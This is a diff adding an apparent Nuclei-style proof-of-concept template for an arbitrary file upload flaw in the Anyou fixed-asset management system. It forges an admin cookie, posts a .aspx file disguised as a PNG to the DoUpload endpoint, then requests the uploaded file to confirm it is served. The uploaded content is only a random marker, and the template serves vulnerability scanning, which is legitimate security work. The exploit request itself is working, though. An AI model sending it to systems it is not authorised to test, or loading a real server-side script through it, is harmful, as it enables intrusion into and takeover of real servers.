@@ -1,0 +1,56 @@
+id: poc-yaml-anyou-fams-doupload-anyfile-upload
+info:
+  name: 安友固定资产管理系统 DoUpload 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: 文件上传
+
+variables:
+  t1: "{{rand_text_alphanumeric(7)}}"
+  t2: "{{base64(t1)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/manage/Attachment/DoUpload?bocode=1"
+    headers:
+      Cookie: AnnYouDevBaseAdfv3adfUserCode=admin;
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
+    body: |-
+      ------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+      Content-Disposition: form-data; name="file" filename="{{t1}}.aspx"
+      Content-Type: image/png
+
+      {{t2}}
+      ------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - ".aspx"
+    extractors:
+      - type: regex
+        name: file
+        internal: true
+        group: 1
+        regex:
+          - "\"ServerFileName\":\"/upload/(?P<file>.*?).aspx"
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/upload/{{file}}.aspx"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
